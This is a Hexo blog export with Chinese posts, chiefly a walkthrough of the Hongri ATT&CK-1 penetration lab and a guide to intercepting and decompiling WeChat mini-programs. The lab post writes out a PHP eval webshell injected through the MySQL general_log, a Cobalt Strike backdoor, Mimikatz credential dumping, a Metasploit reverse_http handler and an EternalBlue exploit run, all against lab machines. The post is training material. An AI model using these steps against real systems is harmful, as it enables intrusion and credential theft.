    <url>/2022/10/04/%E6%97%A5%E8%AE%B0-%E6%AF%8F%E6%97%A5%E4%B8%80%E8%AE%B0%E4%BD%8F/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ef6aa6bd686c166898f81f4b9171709c1f476fbf0c9b22dfeaf27be0bd68de2a"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>日记</category>
      </categories>
  </entry>
  <entry>
    <title>[靶场练习]ATT&amp;CK-1</title>
    <url>/2022/10/04/ATT&amp;CK-1/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre><code>本文章靶场采用红日靶场，模拟真实企业环境，通过练习、视频教程、博客三位一体学习，从环境搭建、漏洞利用、内网搜集、横向移动、构建通道、持久控制、痕迹清理等方式进行搭建靶场和设计题目。虚拟机所有统一密码为hongrisec@2019
</code></pre>
<p><a href="https://imgtg.com/image/nyEGD"><img src="https://i.imgtg.com/2022/05/31/nyEGD.png" alt="nyEGD.png"></a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先下载vulnstack自带的靶场环境，13g没把我吓傻<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">靶场地址</a><br>下载完之后得到三个虚拟机文件，直接在vmware打开就行。首先得配置虚拟机网络，使得能够模拟内网。网络拓扑如下：<br><a href="https://imgtg.com/image/nvpTB"><img src="https://i.imgtg.com/2022/05/31/nvpTB.png" alt="nvpTB.png"></a><br>可以看到Win7需要设置两个网卡，内网网卡和外网网卡。Win3和Win8皆内网网卡即可。</p>
<p>总体编辑网络如下：<br><a href="https://imgtg.com/image/nvJZs"><img src="https://i.imgtg.com/2022/05/31/nvJZs.png" alt="nvJZs.png"></a><br>1.Vm1网卡作为仅主机模式，设置为52网段。因为三台域环境虚拟机的IP初始状态被设置为固定的192.168.52.XXX&#x2F;24网段。（同时已配置好域控IP必定为192.168.52.138）</p>
<p>Win7编辑网络如下：<br><a href="https://imgtg.com/image/nv69r"><img src="https://i.imgtg.com/2022/05/31/nv69r.png" alt="nv69r.png"></a><br><a href="https://imgtg.com/image/nv47S"><img src="https://i.imgtg.com/2022/05/31/nv47S.png" alt="nv47S.png"></a><br><a href="https://imgtg.com/image/nvXUM"><img src="https://i.imgtg.com/2022/05/31/nvXUM.png" alt="nvXUM.png"></a>    </p>
<p>Win3和Win8编辑网络如下：<br><a href="https://imgtg.com/image/nvGPi"><img src="https://i.imgtg.com/2022/05/31/nvGPi.png" alt="nvGPi.png"></a><br><a href="https://imgtg.com/image/nvEzL"><img src="https://i.imgtg.com/2022/05/31/nvEzL.png" alt="nvEzL.png"></a></p>
<p>ping通情况：<br>1.内网win3和win8相互ping通，win7可以ping通外网和内网机器，内网机器则ping不通win7。<br>2.本机可以ping通win7。</p>
<table>
<thead>
<tr>
<th>主机</th>
<th>IP地址</th>
</tr>
</thead>
<tbody><tr>
<td>本机</td>
<td>192.168.123.44</td>
</tr>
<tr>
<td>win7外网服务器</td>
<td>外网IP：192.168.123.42 内网IP：192.168.52.143</td>
</tr>
<tr>
<td>Win3域成员</td>
<td>内网IP：192.168.52.141</td>
</tr>
<tr>
<td>Win8域控主机</td>
<td>内网IP：192.168.52.138</td>
</tr>
<tr>
<td>kali攻击机（MSF、CS服务器）</td>
<td>IP：192.168.123.106</td>
</tr>
</tbody></table>
<h2 id="外网突破"><a href="#外网突破" class="headerlink" title="外网突破"></a>外网突破</h2><p>要进入内网，先进行外网打点，找到目标单位的外网服务站点、主机漏洞，并获得Shell，借助外网服务器当作跳板机访问目标内网。</p>
<p>先了解基本的渗透流程</p>
<pre><code>信息收集：目标站点的IP、域名、服务、DNS、端口、框架、数据库
 |
外网打点：针对不同点发现漏洞（这里最看重渗透能力）
 |
内网提权：寻找可以提权，如内核，命令等
 |
内网漫游：寻找内网主机，查看他们漏洞，找通用，CS上线（理想状态）
</code></pre>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用nmap对目标IP进行端口探测</p>
<blockquote>
<p>nmap -sF -p 1-65535 192.168.123.43</p>
</blockquote>
<p><a href="https://imgtg.com/image/ny23S"><img src="https://i.imgtg.com/2022/05/31/ny23S.png" alt="ny23S.png"></a><br>发现存在http、mysql服务。<br>使用nmap对目标IP</p>
<blockquote>
<p>nmap -sF -O 192.168.123.42</p>
</blockquote>
<p><a href="https://imgtg.com/image/nyXtC"><img src="https://i.imgtg.com/2022/05/31/nyXtC.png" alt="nyXtC.png"></a></p>
<p>查看web服务，收集到的信息如下：</p>
<pre><code>php-version：5.4
apache-version：2.4
admin邮箱：	admin@phpStudy.net
网站路径：	C:/phpStudy/WWW
探针路径：	C:/phpStudy/WWW/1.php
</code></pre>
<p>进行路径遍历，使用dirsearch</p>
<blockquote>
<p>python3 dirsearch.py -u “<a href="http://192.168.123.42/&quot;">http://192.168.123.42/&quot;</a> -x 400,403,503,500</p>
</blockquote>
<p><a href="https://imgtg.com/image/nyu2L"><img src="https://i.imgtg.com/2022/05/31/nyu2L.png" alt="nyu2L.png"></a></p>
<p>出现phpmyadmin，查看是否可以连接mysql。</p>
<p>在看3306端口，可以使用MSF进行弱密码爆破。</p>
<h3 id="3306端口试探"><a href="#3306端口试探" class="headerlink" title="3306端口试探"></a>3306端口试探</h3><p>查看3306打开，进行弱口令爆破，打开MSF<br><a href="https://imgtg.com/image/ny3bi"><img src="https://i.imgtg.com/2022/05/31/ny3bi.png" alt="ny3bi.png"></a><br>使用mysql模块</p>
<blockquote>
<p>search mysql</p>
</blockquote>
<p><a href="https://imgtg.com/image/npX4F"><img src="https://i.imgtg.com/2022/06/01/npX4F.png" alt="npX4F.png"></a></p>
<pre><code>use scanner/mysql/mysql_login
set USERNAME root
set PASS_FILE /home/l3ife/字典/撞库列表名单.txt
</code></pre>
<p>爆破不出来，换种思路。</p>
<h3 id="Mysql写日志shell"><a href="#Mysql写日志shell" class="headerlink" title="Mysql写日志shell"></a>Mysql写日志shell</h3><p>首先看页面，为php探针，用来探测配置，例如查看服务器参数、php模块和参数、检测某些函数能否使用和支持mysql连接正常。<br><a href="https://imgtg.com/image/npCmb"><img src="https://i.imgtg.com/2022/06/01/npCmb.png" alt="npCmb.png"></a><br>输入root&#x2F;root<br><a href="https://imgtg.com/image/npwVl"><img src="https://i.imgtg.com/2022/06/01/npwVl.png" alt="npwVl.png"></a><br>连接mysql成功</p>
<p>在前面dirsearch检测目录存在phpmyadmin，root&#x2F;root登录进去目标网站数据库。</p>
<p>phpmyadmin渗透思路：</p>
<pre><code>get shell：
    int outfile写入webshell
        1.1 当前数据库用户有写权限
        1.2 web绝对路径
        1.3 web路径可以写入
日志 get shell：
    条件：
        1.读写权限+WEB绝对路径
已知CVE攻击
</code></pre>
<p>这里尝试一下，先执行SQL语句select @@basedir;查看网站物理路径<br><a href="https://imgtg.com/image/nJT4S"><img src="https://i.imgtg.com/2022/06/01/nJT4S.png" alt="nJT4S.png"></a><br>查看数据库用户是否具有写权限<br><a href="https://imgtg.com/image/nJU6N"><img src="https://i.imgtg.com/2022/06/01/nJU6N.png" alt="nJU6N.png"></a><br>secure_file_priv默认为NULL，不允许导入导出。直接get shell失败，尝试日志写shell。</p>
<p>执行命令</p>
<pre><code>1.show variables like &#39;%general%&#39;; //查看日志状态，当general_log开启，执行SQL语句会存在stu1.log里，修改general_log_file的值，执行SQL语句就会生成对应文件，便可以执行shell。
2.SET GLOBAL general_log=&#39;on&#39;; //开启日志
3.SET GLOBAL general_log_file=&#39;C:/phpStudy/www/shell.php&#39; //指定日志写入到网站根目录下的shell.php文件
4.SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; //写入shell
</code></pre>
<p><a href="https://imgtg.com/image/nJkmL"><img src="https://i.imgtg.com/2022/06/01/nJkmL.png" alt="nJkmL.png"></a><br><a href="https://imgtg.com/image/nJxYi"><img src="https://i.imgtg.com/2022/06/01/nJxYi.png" alt="nJxYi.png"></a></p>
<p>写入shell，直接访问该shell就行。<br><a href="https://imgtg.com/image/nJhAt"><img src="https://i.imgtg.com/2022/06/01/nJhAt.png" alt="nJhAt.png"></a><br>进行蚁剑连接。<br><a href="https://imgtg.com/image/nJiSx"><img src="https://i.imgtg.com/2022/06/01/nJiSx.png" alt="nJiSx.png"></a></p>
<hr>
<p>这里拿yxcms后台上传shell也可以。<br>网站给了后台地址&#x2F;index.php?r&#x3D;admin &#x2F; 账号密码为admin&#x2F;123456<br><a href="https://imgtg.com/image/nJ7np"><img src="https://i.imgtg.com/2022/06/01/nJ7np.png" alt="nJ7np.png"></a><br>cms后台系列，可以找模板编辑，找到“前台编辑”功能，编辑文件：<br><a href="https://imgtg.com/image/nJNDU"><img src="https://i.imgtg.com/2022/06/01/nJNDU.png" alt="nJNDU.png"></a><br>需要找到木马上传到哪个位置，通过找到源码发现生成在&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;路径（遍历目录存在beifen.rar源码）<br><a href="https://imgtg.com/image/nJe6Y"><img src="https://i.imgtg.com/2022/06/01/nJe6Y.png" alt="nJe6Y.png"></a><br>蚁剑连接<br><a href="https://imgtg.com/image/nJAkv"><img src="https://i.imgtg.com/2022/06/01/nJAkv.png" alt="nJAkv.png"></a><br>自此外网边界突破已成功，重点来学习内网知识。</p>
<h2 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h2><p>目的是通过win7外网服务器主机的控制权，横向渗透内网，拿下域控。首先进行内网信息收集，摸清内网域组成和网络拓扑。</p>
<h3 id="CS-Backdoor上线"><a href="#CS-Backdoor上线" class="headerlink" title="CS Backdoor上线"></a>CS Backdoor上线</h3><p>拿下服务器权限要植入Backdoor，可以尝试MSF或者CS。这里使用CS。</p>
<p>使用kali运行CS服务,先下载CS并放到kali上，切换到CS目录</p>
<pre><code>./teamserver kali的IP  密码 //启动CS
</code></pre>
<p>本机开启客户端，连接kali<br><a href="https://imgtg.com/image/n4yPD"><img src="https://i.imgtg.com/2022/06/02/n4yPD.png" alt="n4yPD.png"></a><br><a href="https://imgtg.com/image/n4pT6"><img src="https://i.imgtg.com/2022/06/02/n4pT6.png" alt="n4pT6.png"></a><br>生成exe可执行Backdoor程序<br><a href="https://imgtg.com/image/n4JvP"><img src="https://i.imgtg.com/2022/06/02/n4JvP.png" alt="n4JvP.png"></a><br>把exe通过蚁剑放到win7的网站目录下<br><a href="https://imgtg.com/image/n4Pdb"><img src="https://i.imgtg.com/2022/06/02/n4Pdb.png" alt="n4Pdb.png"></a><br>蚁剑运行exe文件，CS靶机上线<br><a href="https://imgtg.com/image/n4tOl"><img src="https://i.imgtg.com/2022/06/02/n4tOl.png" alt="n4tOl.png"></a></p>
<p>使用提权功能，提权为system权限<br><a href="https://imgtg.com/image/n4Cac"><img src="https://i.imgtg.com/2022/06/02/n4Cac.png" alt="n4Cac.png"></a><br>使用Mimikatz抓取本机用户密码（注意的是，mimikatz需要过杀软，而需要的免杀又是另一个研究方向了）<br><a href="https://imgtg.com/image/n4wer"><img src="https://i.imgtg.com/2022/06/02/n4wer.png" alt="n4wer.png"></a><br>在View里的credentials里可以看到hashdump与mimikatz获取的数据<br><a href="https://imgtg.com/image/nDMGM"><img src="https://i.imgtg.com/2022/06/02/nDMGM.png" alt="nDMGM.png"></a><br>win7的登录密码出来了。</p>
<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><p>进入beacon，通过shell+命令进行收集信息。查询域控以及域内的其他主机，附上部分内网信息收集的命令：</p>
<pre><code>net view                 # 查看局域网内其他主机名
net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
net user                 # 查看本机用户列表
net user /domain         # 查看域用户
net localgroup administrators # 查看本地管理员组（通常会有域用户）
net view /domain         # 查看有几个域
net user 用户名 /domain   # 获取指定域用户的信息
net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
net group 组名 /domain    # 查看域中某工作组
net group &quot;domain admins&quot; /domain  # 查看域管理员的名字
net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名
net group &quot;doamin controllers&quot; /domain  # 查看域控制器主机名（可能有多台）
</code></pre>
<p>1.判断是否存在域，</p>
<blockquote>
<p>net config workstation &#x2F;&#x2F;查看本机的计算机名、用户名、系统版本、工作站、域、登录域的全面信息</p>
</blockquote>
<p><a href="https://imgtg.com/image/n4Q9S"><img src="https://i.imgtg.com/2022/06/02/n4Q9S.png" alt="n4Q9S.png"></a></p>
<pre><code>判断域：
    1.ipconfig \all
    2.systeminfo
    3.net time /domain 
        1.存在域，当前用户不是域用户
        2.存在域，当前用户是域用户
        3.不存在域
    4.shell net view /domain //查看当前域
</code></pre>
<p>2.查看有几个域</p>
<blockquote>
<p>net view &#x2F;domain</p>
</blockquote>
<p><a href="https://imgtg.com/image/nDzGg"><img src="https://i.imgtg.com/2022/06/02/nDzGg.png" alt="nDzGg.png"></a><br>DNS服务器名为god.org,当前登录域为GOD，只存在一个域。</p>
<p>3.查看域控制器的主机用户名,确认域控主机</p>
<blockquote>
<p>net group “domain controllers” &#x2F;domain</p>
</blockquote>
<p><a href="https://imgtg.com/image/nDF3B"><img src="https://i.imgtg.com/2022/06/02/nDF3B.png" alt="nDF3B.png"></a><br>发现域控主机名为OWA</p>
<p>4.查询域内的存活主机信息,得知域控主机的IP为192.168.52.138，为win8域控主机。</p>
<blockquote>
<p>net view</p>
</blockquote>
<p><a href="https://imgtg.com/image/nDntK"><img src="https://i.imgtg.com/2022/06/02/nDntK.png" alt="nDntK.png"></a></p>
<p>5.发现局域网还存在另一台主机（名称为ROOT-TVI862UBEH），确认该主机是否存在域内。查看域中的其他主机名。</p>
<blockquote>
<p>shell net group “domain computers” &#x2F;domain</p>
</blockquote>
<p><a href="https://imgtg.com/image/nDNWS"><img src="https://i.imgtg.com/2022/06/02/nDNWS.png" alt="nDNWS.png"></a></p>
<p>确认域控主机为192.168.52.138,存在另一台域成员192.168.52.141（Win3），接下来就是进行横向渗透拿下域控。</p>
<h2 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h2><p>通过WIn7跳板机，横向渗透拿下内网域内的域成员和域控主机。内网主机漏洞多存在于系统老旧，未打补丁。</p>
<h3 id="CS派生会话给MSF"><a href="#CS派生会话给MSF" class="headerlink" title="CS派生会话给MSF"></a>CS派生会话给MSF</h3><p>1.在kali进行MSF监听</p>
<pre><code>use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.123.106
set lport 6666
exploit 
</code></pre>
<p><a href="https://imgtg.com/image/nDKoL"><img src="https://i.imgtg.com/2022/06/02/nDKoL.png" alt="nDKoL.png"></a><br>2.CS开启监听<br>回到CS的客户端添加监听器，Payload为windows&#x2F;foreign&#x2F;reverse_http，IP为MSF的IP，监听端口为MSF监听的端口<br><a href="https://imgtg.com/image/nDy3t"><img src="https://i.imgtg.com/2022/06/02/nDy3t.png" alt="nDy3t.png"></a><br>3.进行派生会话，从CS-MSF，选择刚才创建的监听器<br><a href="https://imgtg.com/image/nDmix"><img src="https://i.imgtg.com/2022/06/02/nDmix.png" alt="nDmix.png"></a><br>返回kali的MSF获得shell会话<br><a href="https://imgtg.com/image/nDptj"><img src="https://i.imgtg.com/2022/06/02/nDptj.png" alt="nDptj.png"></a><br>4.MSF简单利用<br>调用post&#x2F;windows&#x2F;gather&#x2F;checkvm判断靶机是否为虚拟机<br><a href="https://imgtg.com/image/nDJ2p"><img src="https://i.imgtg.com/2022/06/02/nDJ2p.png" alt="nDJ2p.png"></a><br>调用post&#x2F;windows&#x2F;gather&#x2F;enum_applications模块枚举列出安装在靶机上的应用程序<br><a href="https://imgtg.com/image/nDRbU"><img src="https://i.imgtg.com/2022/06/02/nDRbU.png" alt="nDRbU.png"></a></p>
<h3 id="MSF进行永恒之蓝"><a href="#MSF进行永恒之蓝" class="headerlink" title="MSF进行永恒之蓝"></a>MSF进行永恒之蓝</h3><p>借助MSF集成的攻击模块拿下内网其他机器。</p>
<p>1.首先配置静态路由，MSF访问不到内网机器，可以在MSF基础上添加一条去往内网的路由，就可以使用MSF访问原本访问不到的内网资源。</p>
<pre><code>meterpreter &gt; run post/multi/manage/autoroute
meterpreter &gt; run post/multi/manage/autoroute SUBNET=192.168.52.0 ACTION=ADD
</code></pre>
<p>添加失败，路由已经存在<br><a href="https://imgtg.com/image/nDHqq"><img src="https://i.imgtg.com/2022/06/02/nDHqq.png" alt="nDHqq.png"></a><br>2.返回MSF对内网主机探测端口</p>
<pre><code>msf6 &gt; use auxiliary/scanner/portscan/tcp
msf6 &gt; set rhosts 192.168.52.141 
msf6 &gt; set ports 80,135-139,445,3306,3389
msf6 &gt; run
</code></pre>
<p><a href="https://imgtg.com/image/nDLrc"><img src="https://i.imgtg.com/2022/06/02/nDLrc.png" alt="nDLrc.png"></a><br>发现开启了139和445端口，利用同方法对域控主机192.168.52.138进行端口扫描</p>
<pre><code>msf6 &gt; use auxiliary/scanner/portscan/tcp
msf6 &gt; set rhosts 192.168.52.138
msf6 &gt; set ports 80,135-139,445,3306,3389
msf6 &gt; run
</code></pre>
<p><a href="https://imgtg.com/image/nDEQr"><img src="https://i.imgtg.com/2022/06/02/nDEQr.png" alt="nDEQr.png"></a><br>3.使用ms17-010攻击<br>使用msf漏洞扫描模块进行扫描</p>
<pre><code>msf6 &gt;search ms17_010 #搜索MSF集成的与ms17_010漏洞相关的模块
msf6 &gt;use auxiliary/scanner/smb/smb_ms17_010 # 加载扫描exp
msf6 &gt;set rhosts 192.168.52.141 #设置被扫描的主机IP
msf6 &gt;run  #进行扫描，观察是否存在该漏洞
</code></pre>
<p>发现都存在ms17-010漏洞<br><a href="https://imgtg.com/image/nDSiG"><img src="https://i.imgtg.com/2022/06/02/nDSiG.png" alt="nDSiG.png"></a><br>使用exp进行攻击</p>
<pre><code>msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
msf6 &gt; set rhost 192.168.52.138
msf6 &gt; run
</code></pre>
<p><a href="https://imgtg.com/image/nDu6K"><img src="https://i.imgtg.com/2022/06/02/nDu6K.png" alt="nDu6K.png"></a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>大体思路如下<br><img src="https://i.imgtg.com/2022/06/27/Nxhka.png" alt="Nxhka.png"><br>对于内网我参考了很多博主，也学习到一些思路和原理。在正常渗透测试中，不可能一帆风顺。要知道原理，尝试不同的方法。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_31773159/article/details/113910351">msf各种弱口令爆破</a><br><a href="https://zhuanlan.zhihu.com/p/114184542">phpmyadmin渗透利用</a><br><a href="https://www.freebuf.com/articles/web/268593.html">内网信息收集</a><br><a href="https://bwshen.blog.csdn.net/article/details/118338328">windows域环境身份认证与攻击思路</a><br><a href="https://cn-sec.com/archives/632621.html">域内密码抓取方法总结</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/107856140">CS与MSF之间的会话派发与端口转发</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>渗透学习</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>环境搭建</title>
    <url>/2022/10/04/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这段时间学习一下小程序挖洞，找一些不起眼的小程序下手，再顺便复习一下JS</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这里是安装证书，使用MUMU模拟器和BURP</p>
<p>先查看自己IP地址</p>
<p><img src="https://s2.loli.net/2022/11/06/Vx5o8FsfiZpekDj.png" alt="image.png"></p>
<p>在burp里设置代理</p>
<p><img src="https://s2.loli.net/2022/11/06/L2dNQz78ADCB6kZ.png" alt="image.png"></p>
<p>导出证书，并保存为cer</p>
<p><img src="https://s2.loli.net/2022/11/06/c8RkGy4T1Y2OZUr.png" alt="image.png"></p>
<p>搜索共享文件夹，把cer放里面</p>
<p><img src="https://s2.loli.net/2022/11/06/1F2hCgki95AqBUY.png" alt="image.png"></p>
<p>来到MUMU模拟器，找到设置-WLAN-高级-安装证书，选择共享文件</p>
<p><img src="https://s2.loli.net/2022/11/06/NayC27vs8gteYxT.png" alt="image.png"></p>
<p><img src="https://s2.loli.net/2022/11/06/c3ZrlDoFBOgXpPa.png" alt="image.png"></p>
<p>安装证书</p>
<p><img src="https://s2.loli.net/2022/11/06/Mmg5tbISDf1EvCc.png" alt="image.png"></p>
<p>接下来设置MUMU代理</p>
<p>设置-WLAN-长按wifi名-修改网络-高级选项-代理手动-输入burp的iP和端口</p>
<p><img src="https://s2.loli.net/2022/11/06/1CZxiEdDSfm9MJX.png" alt="image.png"></p>
<p>抓包成功</p>
<p><img src="https://s2.loli.net/2022/11/06/O5G8Qi3rBvLPlaf.png" alt="image.png"></p>
<h1 id="反编译文件"><a href="#反编译文件" class="headerlink" title="反编译文件"></a>反编译文件</h1><p>这里下载RE文件管理器+微信</p>
<pre><code>链接：https://pan.baidu.com/s/121xiBKtdzIeLCE5YQGE1kw 
提取码：9528 
</code></pre>
<p>给ROOT权限</p>
<p><img src="https://s2.loli.net/2022/11/06/7NQB5WEsx24uZvr.png" alt="image.png"></p>
<p>打开RE文件管理器</p>
<p><img src="https://s2.loli.net/2022/11/06/WorPpdFmCcVzl9J.png" alt="image.png"></p>
<p>进入该路径</p>
<pre><code>/data/data/com.tencent.com/MicroMsg
</code></pre>
<p><img src="https://s2.loli.net/2022/11/06/lN27mUns1LIZG6g.png" alt="image.png"></p>
<p>MicroMsg会保存用户相关信息，每访问一个小程序就会产生一个哈希值作为用户标识</p>
<p><img src="https://s2.loli.net/2022/11/06/92plywq6NWGrOjf.png" alt="image.png"></p>
<p>进入路径，哈希值&#x2F;appbrand，里面包含pkg（执行文件）</p>
<p><img src="https://s2.loli.net/2022/11/06/Nv2PzIteG5wZDEn.png" alt="image.png"></p>
<p>进入pkg目录，找到最近的一个wxapkg文件，是刚刚缓存的小程序文件，但是为二进制文件，需要进行反编译处理</p>
<p><img src="https://s2.loli.net/2022/11/06/tL5SjmCxK1AGQFn.png" alt="image.png"></p>
<p>将文件压缩为gz，发送给微信</p>
<p>下载载反编译工具</p>
<pre><code>https://github.com/ezshine/wxapkg-convertor/releases
</code></pre>
<p><img src="https://s2.loli.net/2022/11/06/31eOTbNmEoaLXfZ.png" alt="image.png"></p>
<p>注意的话，需要下载nodejs和配置一些东西才能反编译成功并生成文件</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://forum.butian.net/share/1227">https://forum.butian.net/share/1227</a></p>
<p><a href="https://www.freebuf.com/articles/web/276108.html">https://www.freebuf.com/articles/web/276108.html</a></p>
<p><a href="https://www.0xby.com/4312.html">https://www.0xby.com/4312.html</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>小程序</category>
      </categories>
      <tags>
        <tag>小程序</tag>
      </tags>
  </entry>
</search>
